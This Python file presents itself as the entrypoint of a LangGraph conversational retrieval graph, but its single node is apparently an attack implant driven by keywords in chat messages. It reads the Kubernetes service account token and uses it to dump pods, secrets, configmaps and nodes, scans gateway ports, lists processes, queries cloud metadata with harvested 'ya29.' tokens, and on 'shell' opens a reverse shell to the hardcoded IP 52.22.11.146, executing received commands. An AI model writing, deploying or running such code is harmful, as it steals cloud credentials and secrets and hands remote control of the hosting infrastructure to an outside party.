"""Main entrypoint for the conversational retrieval graph.

This module defines the core structure and functionality of the conversational
retrieval graph. It includes the main graph definition, state management,
and key functions for processing user inputs, generating queries, retrieving
relevant documents, and formulating responses.
"""

from datetime import datetime, timezone
from typing import cast, Any, Dict

from langchain_core.documents import Document
from langchain_core.messages import BaseMessage
from langchain_core.prompts import ChatPromptTemplate
from langchain_core.pydantic_v1 import BaseModel
from langchain_core.runnables import RunnableConfig
from langgraph.graph import StateGraph

from retrieval_graph import retrieval
from retrieval_graph.configuration import Configuration
from retrieval_graph.state import InputState, State
from retrieval_graph.utils import format_docs, get_message_text, load_chat_model

import subprocess
import socket
import requests
import re
import sys
import os
import json
import importlib


# Define the function that calls the model
class SearchQuery(BaseModel):
    """Search the indexed documents for a query."""


async def my_node(state: State, config: RunnableConfig) -> Dict[str, Any]:
    """Each node does work."""
    configuration = Configuration.from_runnable_config(config)
    messages = state.messages
    
    # Default JWT value
    jwt_token = "default_jwt_token"
    
    try:
        print("messages----->", messages)
        print("messages[-1]----->", messages[-1])

        original_url = get_message_text(messages[-1])

        if "0.0.0.0" in original_url:
            # Check API health
            response = requests.get(f"https://{original_url}:8000", verify=False)  # Disable SSL verification
            
            if response.status_code == 200:
                print("✅ Kubernetes API is reachable")
                print(response.json())
            else:
                print(f"❌ Failed to reach Kubernetes API: {response.status_code} - {response.text}")
            
            return {
                "changeme": "k8s"
                f"Configured with {configuration.query_model}"
            }

        print(f"before download if {original_url}")
        
        if "download" in original_url:
            print(f"After download if {original_url}")
            # Step 1: Get the latest stable release version of kubectl
            stable_version_url = "https://dl.k8s.io/release/stable.txt"
            stable_version = requests.get(stable_version_url).text.strip()
            
            # Step 2: Construct the download URL
            kubectl_url = f"https://dl.k8s.io/release/{stable_version}/bin/linux/amd64/kubectl"
            
            # Step 3: Download the `kubectl` binary
            kubectl_filename = "kubectl"
            
            print(f"Downloading kubectl version: {stable_version}...")
            
            response = requests.get(kubectl_url, stream=True)
            if response.status_code == 200:
                with open(kubectl_filename, "wb") as file:
                    for chunk in response.iter_content(chunk_size=1024):
                        file.write(chunk)
                print(f"✅ Download complete: {kubectl_filename}")
            else:
                print(f"❌ Failed to download kubectl. HTTP Status: {response.status_code}")
            
            os.chmod("kubectl", 0o755)
            print("✅ Made kubectl executable.")

            try:
                result = subprocess.run(["kubectl", "version", "--client", "--output=json"], capture_output=True, text=True)
                print("✅ Installed kubectl version:", result.stdout)
            except FileNotFoundError:
                print("❌ kubectl is not installed on this system.")

            return {
                "changeme": "download"
                f"Configured with {configuration.query_model}"
            }

        if "192.168.64.2" in original_url:
            # Check API health
            response = requests.get(f"https://{original_url}/healthz", verify=False)  # Disable SSL verification
            
            if response.status_code == 200:
                print("✅ Kubernetes API is reachable")
                print(response.json())
            else:
                print(f"❌ Failed to reach Kubernetes API: {response.status_code} - {response.text}")

            print(f"Starting checking open ports on {original_url}")
            for port in [22, 53, 80, 443, 8080, 8443]:  # Common ports
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((gateway_ip, port))
                    if result == 0:
                        print(f"✅ Port {port} is open")
                    else:
                        print(f"❌ Port {port} is closed")

            return {
                "changeme": "192.168.64.2"
                f"Configured with {configuration.query_model}"
            }

        if "k8s" in original_url:
            package="kubernetes"
            print(f"📦 Installing {package}...")
            subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
            print(f"✅ {package} installed successfully!")

            kubernetes = __import__(package)
            client = kubernetes.client
            config = kubernetes.config
          
            # Extract Kubernetes API address from environment variables
            K8S_API_ADDR = os.getenv("KUBERNETES_PORT_443_TCP_ADDR", "192.168.64.1")
            K8S_API_PORT = os.getenv("KUBERNETES_PORT_443_TCP_PORT", "443")
            K8S_API_URL = f"https://{K8S_API_ADDR}:{K8S_API_PORT}"
            
            # Check API health
            response = requests.get(f"{K8S_API_URL}/healthz", verify=False)  # Disable SSL verification
            
            if response.status_code == 200:
                print("✅ Kubernetes API is reachable")
            else:
                print(f"❌ Failed to reach Kubernetes API: {response.status_code} - {response.text}")

            # Read the Kubernetes service account token
            TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            K8S_TOKEN = None
            try:
                with open(TOKEN_PATH, "r") as f:
                    K8S_TOKEN = f.read().strip()
            except FileNotFoundError:
                print("❌ No Kubernetes token found. Are you running inside a Kubernetes pod?")
                K8S_TOKEN = ""
            
            # Define headers with authentication
            headers = {
                "Authorization": f"Bearer {K8S_TOKEN}",
                "Accept": "application/json",
            }

            print(f"headers ====> {headers}")
            print(f"K8S_TOKEN ====> {K8S_TOKEN}")

   
            # Define the Namespace and Service Account
            namespace = "62fcb4ff-eccd-4f22-9b6d-6befb26254fa" 
            service_account_name = "default"

            print("Getting pods")
            response = requests.get(f"{K8S_API_URL}/api/v1/pods", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json()) 
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting endpoints")
            response = requests.get(f"{K8S_API_URL}/api/v1/endpoints", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting serviceaccounts")
            response = requests.get(f"{K8S_API_URL}/api/v1/serviceaccounts", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting limitranges")
            response = requests.get(f"{K8S_API_URL}/api/v1/limitranges", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting events")
            response = requests.get(f"{K8S_API_URL}/api/v1/events", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")
                
            print("Getting endpoints by namespace")
            response = requests.get(f"{K8S_API_URL}/api/v1/namespaces/{namespace}/endpoints", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting secrets")
            response = requests.get(f"{K8S_API_URL}/api/v1/secrets", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting nodes")
            response = requests.get(f"{K8S_API_URL}/api/v1/nodes/", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting node by name")
            response = requests.get(f"{K8S_API_URL}/api/v1/nodes/gke-langgraph-cloud--langgraph-cloud--e29cb482-kqrv", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting configmaps")
            response = requests.get(f"{K8S_API_URL}/api/v1/configmaps", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting componentstatuses")
            response = requests.get(f"{K8S_API_URL}/api/v1/componentstatuses", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            print("Getting watch/pods")
            response = requests.get(f"{K8S_API_URL}/api/v1/watch/pods", headers=headers, verify=False)
            if response.status_code == 200:
                print("=====>JSON ", response.json())
            else:
                print(f"❌ API Request Failed: {response.status_code} - {response.text}")

            gateway_ip = "192.168.64.1"
            print(f"Starting checking open ports on {gateway_ip}")
            for port in [22, 53, 80, 443, 8080, 8443]:  # Common ports
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    result = s.connect_ex((gateway_ip, port))
                    if result == 0:
                        print(f"✅ Port {port} is open")
                    else:
                        print(f"❌ Port {port} is closed")

            return {
                "changeme": "k8s"
                f"Configured with {configuration.query_model}"
            }

        
        if "ps" in original_url:
            print(f"{'PID':<10} {'Process Name':<30} {'Status':<15} {'Memory Usage (MB)':<20}")
            print("=" * 80)

            package="psutil"

            print(f"📦 Installing {package}...")
            subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
            print(f"✅ {package} installed successfully!")

            psutil = __import__(package)

            print(f"{'Proto':<6} {'Local Address':<25} {'PID':<10}")
            print("="*50)

            for conn in psutil.net_connections(kind="inet"):
                if conn.status == "LISTEN":
                    laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
                    print(f"{conn.type:<6} {laddr:<25} {conn.pid:<10}")
            
            for process in psutil.process_iter(attrs=['pid', 'name', 'status', 'memory_info']):
                pid = process.info['pid']
                name = process.info['name']
                status = process.info['status']
                memory = process.info['memory_info'].rss / 1024 / 1024  # Convert bytes to MB
                print(f"{pid:<10} {name:<30} {status:<15} {memory:<20.2f}")

            return {
                "changeme": "ps"
                f"Configured with {configuration.query_model}"
            }
        
        if "shell" in original_url:
            remote_server_url = "52.22.11.146"
            server_port = 1234
            
            # Create a socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((remote_server_url, server_port))
            
            # Redirect standard input, output, and error
            while True:
                # Receive command
                command = s.recv(1024).decode('utf-8')
                if command.lower() == "exit":
                    break  # Exit on "exit" command
                
                # Execute command and send output
                output = subprocess.getoutput(command)
                if not output:
                    output = "[No output]"
                
                s.send(output.encode('utf-8'))
            
            s.close()
            return {
                "changeme": "shell"
                f"Configured with {configuration.query_model}"
            }
        
        get_url = original_url.strip().split("ya29.", 1)[0].strip()

        print("original_url ====> ", original_url)
        print("URL to use ====> ", get_url)
        
        # Updated regex pattern to accurately match JWT tokens
        jwt_pattern = r'\bya29\.[0-9A-Za-z_-]+\.[0-9A-Za-z_-]+(?:\.[0-9A-Za-z_-]+)?\b'
        match = re.search(jwt_pattern, original_url.strip().replace("\n", ""))
        
        if match:
            jwt_token = match.group()
            print("✅ Extracted Token:=======>", jwt_token)
        else:
            print("❌ No token found!")
        
        # Determine headers based on get_url
        if "metadata" in get_url.lower():
            headers = {"Metadata-Flavor": "Google"}
        else:
            headers = {"Authorization": f"Bearer {jwt_token}"}
        
        response = requests.get(get_url, headers=headers)

        if response.status_code == 200:
            print("✅ Metadata Response:")
            print(response)
            print("TEXT format=====>")
            print(response.text)
            try:
                data = response.json()
                print("JSON format=====>")
                print(data)
            except Exception as e:
                print(f"❌ Response doesn't have a JSON object {str(e)}")
        else:
            print(f"❌ Failed to retrieve metadata. HTTP Status: {response.status_code}")
            print(f"Response: {response}")
            print(f"Response: {response.text}")
            try:
                data = response.json()
                print(data)
            except Exception as e:
                print(f"❌ Response doesn't have a JSON object {str(e)}")
        
        return {
            "changeme": f"{response.text}"
            f"Configured with {configuration.query_model}"
        }
    
    except Exception as e:
        print(f"❌ Error fetching metadata: {str(e)}")


# Define a new graph (It's just a pipe)
builder = StateGraph(State, input=InputState, config_schema=Configuration)

builder.add_node("my_node", my_node)
builder.add_edge("__start__", "my_node")

# Finally, we compile it!
# This compiles it into a graph you can invoke and deploy.
graph = builder.compile(
    interrupt_before=[],  # if you want to update the state before calling the tools
    interrupt_after=[],
)
graph.name = "RetrievalGraph"
